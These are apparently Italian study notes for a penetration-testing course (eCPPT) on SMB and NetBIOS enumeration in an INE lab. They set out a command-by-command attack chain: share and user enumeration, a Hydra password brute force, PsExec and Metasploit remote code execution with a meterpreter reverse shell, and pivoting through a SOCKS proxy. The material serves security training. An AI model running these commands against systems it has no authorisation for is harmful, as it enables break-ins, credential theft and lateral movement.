# 018 — SMB & NetBIOS Enumeration (Network Penetration Testing)

> **Modulo:** Network Penetration Testing · **Video:** 18/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [018_SMB___NetBIOS_Enumeration.mp4.txt](018_SMB___NetBIOS_Enumeration.mp4.txt) · [018_SMB___NetBIOS_Enumeration.mp4.srt](018_SMB___NetBIOS_Enumeration.mp4.srt)

## Concetti chiave

- **NetBIOS** = API + protocollo legacy per name resolution / datagram / session. Porte: **UDP 137 (name)**, **UDP 138 (datagram)**, **TCP 139 (session)**.
- **SMB** = file/printer sharing protocol Windows. Porte: **TCP 445 (direct SMB)**, **TCP 139 (SMB over NetBIOS)**.
- Versioni SMB:
  - **SMBv1** (XP/2003) — insicuro (anonymous logon, null session, EternalBlue).
  - **SMBv2/2.1** (Vista/2008) — fix delle peggiori falle.
  - **SMBv3+** (Win8/2012+) — encryption, signing, multichannel.
- **Null session** = autenticazione anonima → enumerazione utenti/share.
- Flow base: nmap → identifica SMB → NSE `smb-protocols` / `smb-security-mode` → `smbclient -L //target/ -N` → `smb-enum-users` → brute → PsExec.

## Spiegazione approfondita

### NetBIOS vs SMB
NetBIOS = layer più basso, **3 servizi**:
1. **Name Service (NBNS)** UDP 137 — risoluzione nomi NetBIOS.
2. **Datagram Service** UDP 138 — connectionless broadcast.
3. **Session Service** TCP 139 — connection-oriented (SMB over NetBIOS).

SMB moderno gira **direttamente** su TCP 445 (SMB direct). Su Windows moderni NetBIOS è mantenuto per **backward compatibility** → in pratica vedi quasi sempre **139 + 445 insieme**.

### Workflow del lab

#### Step 1 — Discovery base
```bash
nmap demo.ine.local
# 135 msrpc · 139 netbios-ssn · 445 microsoft-ds · 3389 rdp
```

#### Step 2 — NetBIOS enumeration
```bash
# nbtscan: scan NetBIOS su subnet
nbtscan 10.10.23.0/24
nbtscan -r 10.10.23.0/24       # usa source port 137

# nmblookup: name service per singolo host
nmblookup -A <target>
```

#### Step 3 — NSE per NetBIOS name
```bash
sudo nmap -sU -sV -T4 --script nbstat.nse -p 137 -Pn -n <target>
```

#### Step 4 — Identifica versione SMB
```bash
# Lista tutti gli NSE SMB
ls /usr/share/nmap/scripts/ | grep -E "smb-"

# Versioni supportate (CRITICO: scopri se c'è SMBv1)
sudo nmap -p 445 --script smb-protocols <target>
# Output: NT LM 0.12 (SMBv1) - dangerous · 2.02 · 2.10 · 3.00 · 3.02
```

#### Step 5 — Security mode
```bash
sudo nmap -p 445 --script smb-security-mode <target>
# Account used: guest · authentication_level: user
# message_signing: disabled (dangerous, default)
```

#### Step 6 — Null session test con `smbclient`
```bash
smbclient -L //demo.ine.local -N
# Premere Invio su password → se elenca share = null session attiva
# Tipiche share: ADMIN$, C$, IPC$, custom
```

#### Step 7 — User enumeration via SMB
```bash
sudo nmap -p 445 --script smb-enum-users <target>
# Enumera account: admin, administrator, guest, root...
```

#### Step 8 — Brute force credenziali (Hydra)
```bash
hydra -L users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      smb://demo.ine.local
# → password trovata per administrator (es. "password1")
```

#### Step 9 — RCE autenticato con PsExec (impacket)
```bash
impacket-psexec administrator@demo.ine.local
# password: password1
# → shell NT AUTHORITY\SYSTEM
```

Oppure con Metasploit:
```
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS demo.ine.local
msf6 > set SMBUser administrator
msf6 > set SMBPass password1
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > exploit
```

#### Step 10 — Pivoting verso demo1.ine.local
Dal meterpreter su demo.ine.local:
```
meterpreter > run autoroute -s <subnet_demo1>
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set VERSION 4a
msf6 > set SRVPORT 9050
msf6 > run -j

# Da bash su Kali:
proxychains nmap -sT -Pn -sV -p 445 demo1.ine.local
```

#### Step 11 — Net view / net use sulle share
Dopo migrate su `explorer.exe` (perde NT AUTHORITY\SYSTEM ma ottiene access token utente):
```cmd
net view \\<demo1_ip>
net use D: \\<demo1_ip>\Documents
net use K: \\<demo1_ip>\K
dir D:
```

## Comandi & strumenti

| Tool | Scopo | Esempio |
|---|---|---|
| `nbtscan <subnet>` | NetBIOS name scan | `nbtscan 10.10.23.0/24` |
| `nmblookup -A <ip>` | NetBIOS name lookup | |
| `nmap --script nbstat.nse -p 137 -sU` | NSE NetBIOS info | |
| `nmap --script smb-protocols -p 445` | Enumera versioni SMB | Trova SMBv1 |
| `nmap --script smb-security-mode -p 445` | Auth level + signing | |
| `nmap --script smb-enum-users -p 445` | User enum via SMB | |
| `nmap --script smb-enum-shares -p 445` | Share enum | |
| `nmap --script smb-enum-domains -p 445` | Domain info | |
| `smbclient -L //<target>/ -N` | List share via null session | `-N` = no password |
| `smbclient //<target>/<share> -N` | Connetti a share | |
| `smbmap -H <target>` | Lista share + permission | |
| `rpcclient -U "" -N <target>` | Null session RPC | `enumdomusers`, `querydominfo` |
| `enum4linux -a <target>` | One-stop SMB enum | All-in-one |
| `hydra ... smb://<target>` | Brute force SMB | |
| `impacket-psexec user:pass@<target>` | RCE autenticato | shell SYSTEM |
| `exploit/windows/smb/psexec` (msf) | Modulo Metasploit | |
| `net view \\<target>` | Lista share da Windows | |
| `net use <letter>: \\<target>\<share>` | Mappa share | |

## Esempi pratici

```bash
# Workflow completo
sudo nmap -p 139,445 -sV --script "smb-protocols,smb-security-mode" <target>
smbclient -L //<target>/ -N
sudo nmap -p 445 --script smb-enum-users <target>
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://<target>
impacket-psexec administrator@<target>

# enum4linux veloce
enum4linux -a <target>

# RPCClient null session
rpcclient -U "" -N <target>
rpcclient $> enumdomusers
rpcclient $> querydominfo
rpcclient $> queryuser <RID>
```

Nota extra: `enum4linux-ng` è la versione moderna mantenuta (Python3), preferibile su lab nuovi.

## Punti d'attenzione per l'esame eCPPT

- **Porte SMB/NetBIOS** memorizzare: **UDP 137, 138 · TCP 139, 445**.
- **SMBv1 = pericoloso**: null session, EternalBlue (MS17-010), anonymous user enum.
- **Null session test**: `smbclient -L //target -N` + invio su password.
- **NSE chiave**: `smb-protocols`, `smb-security-mode`, `smb-enum-users`, `smb-enum-shares`, `smb-vuln-*`.
- **Tool quick-win**: `enum4linux -a <target>` (one-shot enum completa).
- **`rpcclient -U "" -N`** + `enumdomusers` per user list via RPC.
- **PsExec** (impacket o msf) per RCE autenticato → shell SYSTEM.
- **Pivoting**: `run autoroute` + `socks_proxy` + `proxychains`.
- **Differenza 139 vs 445**: 139 = SMB over NetBIOS; 445 = SMB direct.
- **migrate explorer.exe** può servire per access token utente quando SYSTEM non basta per network share.

## Collegamenti con altri video

- Precedente: [[017_Introduction to Enumeration]]
- Prossimo: [[019_SNMP_Enumeration.mp4]]
- Sfruttamento via SMB relay: [[021_SMB_Relay_Attack.mp4]]
- Pivoting completo: [[025_Windows_Post-Exploitation_Lab.mp4]], modulo Lateral Movement & Pivoting.
- NTLM hash dump dopo accesso: [[024_Dumping___Cracking_NTLM_Hashes.mp4]]
- NSE base: [[013_Nmap Scripting Engine (NSE)]]
